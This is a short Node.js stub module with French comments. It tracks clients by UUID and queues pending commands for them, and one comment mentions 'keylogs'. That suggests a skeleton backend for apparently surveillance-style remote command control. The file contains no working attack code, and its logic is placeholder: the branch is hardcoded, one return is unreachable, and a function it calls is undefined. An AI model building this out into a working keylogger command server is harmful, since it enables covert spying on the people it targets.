'use strict'

module.exports = {

    createOrUpdate: function (uuid) {
        //Appeler la couche DAO pour voir si le client lié au UUID existe.
        //S'il n'existe pas aller dans create
        //S'il existe aller dans update
        if (true ) {
            return {
                isNew: true,
                data: this.create()
            }
        }
        return {
            isNew: false,
            data: this.update()
        }
    },
    create: function () {
        return {
            id: 1,
            name: 'bonjour',
        }
    },
    update: function () {
        return {
            id: 1,
            name: 'bonsoir'
        }
    },

    getCommands: function (uuid) {

        //Appeler la couche DAO pour voir les commandes en attente pour le UUID
        return findPendingCommandsByUuid()
    },
    addCommand: function (uuid) {

        // Permet d'ajouter une commande à la liste des commandes en attente

        // Check si déjà une commande en attente (keylogs)
        // Si oui, alors message erreur sur le front 
        return false
        // Si non, on ajoute à la liste d'attente
        return true
    }
}
